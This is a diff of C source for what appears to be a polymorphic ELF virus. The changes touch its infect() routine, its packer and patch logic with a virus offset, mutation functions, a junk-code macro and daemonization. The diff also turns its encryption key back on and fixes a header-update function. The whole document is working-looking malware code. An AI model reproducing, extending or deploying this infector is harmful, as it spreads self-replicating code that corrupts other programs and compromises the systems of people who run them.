@@ -17,8 +17,6 @@
 #include "death.h"
 #include "syscall.h"
 
-#define __asm__ __asm__ volatile
-
 extern void end();
 
 void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
@@ -30,7 +28,7 @@ void	_start(void);
 
 void __attribute__((naked)) _start(void)
 {
-	__asm__ (
+	__asm__ __volatile__ (
 			"push %rdx\n"
 			"movq 8(%rsp), %rdi\n"
 			"leaq 16(%rsp), %rsi\n"
@@ -115,8 +113,8 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 
 	patch->virus_offset = addr_diff;
 
-	//patch->key = DEFAULT_KEY;
-	patch->key = 0;
+	patch->key = DEFAULT_KEY;
+	//patch->key = 0;
 }
 
 static int packer_patch(t_data *data) {
@@ -197,7 +195,7 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 
 	JUNK;
 
-	if (updade_hdr(&data) != 0) {
+	if (update_hdr(&data) != 0) {
 		free_data(&data);
 		return 1;
 	}
@@ -361,6 +359,9 @@ void	entrypoint(int argc, char **argv, char **envp)
 	bootstrap_data.envp = envp;
 	uint16_t counter = 0;
 
+	file_t file;
+	ft_memset(&file, 0, sizeof(file_t));
+
 #ifndef DEV_MODE
 	//if (pestilence() != 0) {
 	//	return ;
@@ -369,11 +370,9 @@ void	entrypoint(int argc, char **argv, char **envp)
 
 	int start_offset = g_start_offset;
 
-	prepare_mutate(0);
+	prepare_mutate();
 	mutate();
 
-	file_t file;
-	ft_memset(&file, 0, sizeof(file_t));
 
 	daemonize(envp);
 
